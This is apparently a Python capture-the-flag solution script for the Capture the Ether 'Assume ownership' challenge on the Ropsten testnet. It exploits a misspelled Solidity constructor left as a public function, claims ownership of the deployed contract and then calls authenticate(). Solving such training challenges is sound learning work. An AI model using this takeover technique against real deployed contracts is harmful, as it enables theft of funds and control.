from solcx import compile_source
from helper import get_provider_and_account

w3, acct = get_provider_and_account()

# solidity source code
compiled_target = compile_source(

"""
pragma solidity ^0.4.21;

contract AssumeOwnershipChallenge {
    address owner;
    bool public isComplete;

    function AssumeOwmershipChallenge() public {
        owner = msg.sender;
    }

    function authenticate() public {
        require(msg.sender == owner);

        isComplete = true;
    }
}
"""
)

contract_id, contract_interface = compiled_target.popitem()

# get abi
abi = contract_interface["abi"]

assume_ownership = w3.eth.contract(
    address="0x264F2e5A3433C4aa78989Ac92498Cb0791Ced98F",
    abi=abi
)    

# send transaction to contract invoking unprotected ownership function
tx_hash = assume_ownership.functions.AssumeOwmershipChallenge().transact()
print(f"View on Etherscan: https://ropsten.etherscan.io/tx/{tx_hash.hex()}")
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

tx_hash = assume_ownership.functions.authenticate().transact()
print(f"View on Etherscan: https://ropsten.etherscan.io/tx/{tx_hash.hex()}")
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)


print(f"Completed: {assume_ownership.functions.isComplete().call()}")